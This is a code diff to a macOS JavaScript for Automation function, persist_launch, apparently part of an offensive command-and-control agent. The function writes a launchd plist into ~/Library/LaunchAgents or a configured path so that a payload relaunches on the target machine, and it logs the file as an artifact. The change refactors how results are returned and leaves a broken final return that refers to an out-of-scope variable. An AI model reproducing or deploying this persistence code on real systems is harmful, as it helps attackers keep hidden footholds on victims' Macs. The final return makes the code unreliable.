@@ -35,7 +35,6 @@ exports.persist_launch = function(task, command, params){
         template += "</dict>\n</plist>\n"
         // now we need to actually write out the plist to disk
         let response = "";
-        let output = {"user_output":response, "completed": true};
         if(config.hasOwnProperty('LocalAgent') && config['LocalAgent'] === true){
             let path = "~/Library/LaunchAgents/";
             path = $(path).stringByExpandingTildeInPath;
@@ -44,15 +43,16 @@ exports.persist_launch = function(task, command, params){
                 $.fileManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(path, false, $(), $());
             }
             path = $(path.js + "/" + label + ".plist");
-            response = write_data_to_file(template, path);
-            output["artifacts"] =  [{"base_artifact": "File Create", "artifact": path}];
+            response = write_data_to_file(template, path) + " to " + ObjC.deepUnwrap(path);
+            let artifacts = {'user_output': response, 'artifacts': [{'base_artifact': 'File Create', 'artifact': ObjC.deepUnwrap(path)}], "completed": true};
+            return artifacts
         }
         else if(config.hasOwnProperty('LaunchPath') && config['LaunchPath'] !== ""){
-            response = write_data_to_file(template, $(config['LaunchPath']));
-            output["artifacts"] =  [{"base_artifact": "File Create", "artifact": config["LaunchPath"]}];
+            response = write_data_to_file(template, $(config['LaunchPath'])) + " to " + config["LaunchPath"];
+            let artifacts = {'user_output': response, 'artifacts': [{'base_artifact': 'File Create', 'artifact': config["LaunchPath"]}], "completed": true};
+            return artifacts
         }
-        output["user_output"] = response;
-        return output;
+        return artifacts
 
     }catch(error){
         return {"user_output":error.toString(), "completed": true, "status": "error"};
